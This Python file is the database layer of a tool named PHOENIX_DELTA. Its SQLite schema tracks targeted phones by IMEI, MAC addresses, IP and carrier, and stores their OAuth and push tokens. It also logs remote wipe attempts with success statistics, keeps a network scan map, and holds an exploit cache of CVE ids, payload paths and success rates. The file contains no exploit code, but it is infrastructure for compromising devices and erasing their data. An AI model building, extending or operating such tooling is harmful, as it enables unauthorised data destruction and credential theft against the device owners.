"""
PHOENIX_DELTA — Targets Database Layer
SQLite store for IMEI, UDID, IP, Bluetooth MAC, OAuth tokens, carrier info.
"""

import aiosqlite
import json
import os
import time
from typing import Optional, Dict, List, Any

DB_PATH = os.environ.get("PHOENIX_DB", "/app/db/targets.db")


class TargetsDB:
    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self.db: Optional[aiosqlite.Connection] = None

    async def connect(self):
        self.db = await aiosqlite.connect(self.db_path)
        await self.db.execute("PRAGMA journal_mode=WAL")
        await self._create_tables()

    async def _create_tables(self):
        await self.db.executescript("""
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone_number TEXT UNIQUE,
                imei TEXT,
                udid TEXT,
                device_type TEXT DEFAULT 'android',
                device_model TEXT,
                os_version TEXT,
                ip_address TEXT,
                bluetooth_mac TEXT,
                wifi_mac TEXT,
                carrier TEXT,
                mcc TEXT,
                mnc TEXT,
                oauth_token TEXT,
                apns_token TEXT,
                mdm_enrolled INTEGER DEFAULT 0,
                status TEXT DEFAULT 'discovered',
                last_seen REAL,
                wipe_attempts INTEGER DEFAULT 0,
                created_at REAL,
                metadata TEXT DEFAULT '{}'
            );

            CREATE TABLE IF NOT EXISTS wipe_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                method TEXT,
                layer TEXT,
                success INTEGER,
                result TEXT,
                timestamp REAL,
                duration_ms REAL,
                FOREIGN KEY (target_id) REFERENCES targets(id)
            );

            CREATE TABLE IF NOT EXISTS network_map (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE,
                mac_address TEXT,
                hostname TEXT,
                open_ports TEXT DEFAULT '[]',
                device_fingerprint TEXT,
                last_scan REAL
            );

            CREATE TABLE IF NOT EXISTS exploit_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cve_id TEXT,
                target_os TEXT,
                target_version TEXT,
                payload_type TEXT,
                payload_path TEXT,
                success_rate REAL DEFAULT 0.0,
                last_used REAL,
                use_count INTEGER DEFAULT 0
            );

            CREATE INDEX IF NOT EXISTS idx_targets_imei ON targets(imei);
            CREATE INDEX IF NOT EXISTS idx_targets_ip ON targets(ip_address);
            CREATE INDEX IF NOT EXISTS idx_targets_status ON targets(status);
            CREATE INDEX IF NOT EXISTS idx_wipe_log_target ON wipe_log(target_id);
        """)
        await self.db.commit()

    async def upsert_target(self, data: Dict[str, Any]) -> int:
        existing = await self.get_target_by_imei(data.get("imei")) or \
                   await self.get_target_by_ip(data.get("ip_address"))

        if existing:
            fields = []
            values = []
            for k, v in data.items():
                if v is not None:
                    fields.append(f"{k} = ?")
                    values.append(v)
            fields.append("last_seen = ?")
            values.append(time.time())
            values.append(existing["id"])
            await self.db.execute(
                f"UPDATE targets SET {', '.join(fields)} WHERE id = ?",
                values
            )
            await self.db.commit()
            return existing["id"]
        else:
            data.setdefault("created_at", time.time())
            data.setdefault("last_seen", time.time())
            cols = [k for k in data if data[k] is not None]
            vals = [data[k] for k in cols]
            placeholders = ", ".join(["?"] * len(cols))
            cur = await self.db.execute(
                f"INSERT INTO targets ({', '.join(cols)}) VALUES ({placeholders})",
                vals
            )
            await self.db.commit()
            return cur.lastrowid

    async def get_target_by_imei(self, imei: str) -> Optional[Dict]:
        if not imei:
            return None
        cursor = await self.db.execute(
            "SELECT * FROM targets WHERE imei = ?", (imei,)
        )
        row = await cursor.fetchone()
        return self._row_to_dict(row, cursor) if row else None

    async def get_target_by_ip(self, ip: str) -> Optional[Dict]:
        if not ip:
            return None
        cursor = await self.db.execute(
            "SELECT * FROM targets WHERE ip_address = ?", (ip,)
        )
        row = await cursor.fetchone()
        return self._row_to_dict(row, cursor) if row else None

    async def get_target_by_id(self, target_id: int) -> Optional[Dict]:
        cursor = await self.db.execute(
            "SELECT * FROM targets WHERE id = ?", (target_id,)
        )
        row = await cursor.fetchone()
        return self._row_to_dict(row, cursor) if row else None

    async def get_target_by_phone(self, phone: str) -> Optional[Dict]:
        cursor = await self.db.execute(
            "SELECT * FROM targets WHERE phone_number = ?", (phone,)
        )
        row = await cursor.fetchone()
        return self._row_to_dict(row, cursor) if row else None

    async def get_all_targets(self, status: str = None) -> List[Dict]:
        if status:
            cursor = await self.db.execute(
                "SELECT * FROM targets WHERE status = ?", (status,)
            )
        else:
            cursor = await self.db.execute("SELECT * FROM targets")
        rows = await cursor.fetchall()
        return [self._row_to_dict(row, cursor) for row in rows]

    async def log_wipe(self, target_id: int, method: str, layer: str,
                       success: bool, result: str, duration_ms: float):
        await self.db.execute(
            """INSERT INTO wipe_log
               (target_id, method, layer, success, result, timestamp, duration_ms)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (target_id, method, layer, int(success), result, time.time(), duration_ms)
        )
        if success:
            await self.db.execute(
                """UPDATE targets SET status = 'wiped',
                   wipe_attempts = wipe_attempts + 1 WHERE id = ?""",
                (target_id,)
            )
        else:
            await self.db.execute(
                """UPDATE targets SET wipe_attempts = wipe_attempts + 1
                   WHERE id = ?""",
                (target_id,)
            )
        await self.db.commit()

    async def update_target_status(self, target_id: int, status: str):
        await self.db.execute(
            "UPDATE targets SET status = ?, last_seen = ? WHERE id = ?",
            (status, time.time(), target_id)
        )
        await self.db.commit()

    async def store_network_node(self, ip: str, mac: str = None,
                                  hostname: str = None, ports: list = None,
                                  fingerprint: str = None):
        await self.db.execute(
            """INSERT OR REPLACE INTO network_map
               (ip_address, mac_address, hostname, open_ports,
                device_fingerprint, last_scan)
               VALUES (?, ?, ?, ?, ?, ?)""",
            (ip, mac, hostname, json.dumps(ports or []),
             fingerprint, time.time())
        )
        await self.db.commit()

    async def get_wipe_stats(self) -> Dict:
        cursor = await self.db.execute(
            """SELECT
                COUNT(*) as total_attempts,
                SUM(success) as successful,
                COUNT(*) - SUM(success) as failed,
                AVG(duration_ms) as avg_duration_ms
            FROM wipe_log"""
        )
        row = await cursor.fetchone()
        return {
            "total_attempts": row[0],
            "successful": row[1] or 0,
            "failed": row[2] or 0,
            "avg_duration_ms": round(row[3] or 0, 2)
        }

    def _row_to_dict(self, row, cursor) -> Dict:
        if row is None:
            return {}
        columns = [desc[0] for desc in cursor.description]
        return dict(zip(columns, row))

    async def close(self):
        if self.db:
            await self.db.close()
